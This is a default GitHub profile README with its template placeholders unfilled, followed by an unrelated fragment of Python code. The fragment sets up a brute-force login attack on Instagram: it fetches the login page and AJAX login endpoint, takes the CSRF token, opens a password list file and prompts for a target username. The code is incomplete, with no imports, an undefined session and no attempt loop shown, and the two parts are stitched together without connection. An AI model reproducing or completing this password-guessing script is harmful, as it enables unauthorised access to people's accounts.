- 👋 Hi, I’m @emadtermux
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...

<!---
emadtermux/emadtermux is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
link = 'https://www.instagram.com/accounts/login/'
login_url = 'https://www.instagram.com/accounts/login/ajax/'

response = session.get(link)
csrf = response.cookies['csrftoken']

time = int(datetime.now().timestamp())


passwords = open('h.txt', 'r')
username = str(input('Enter your username or gmail: '))
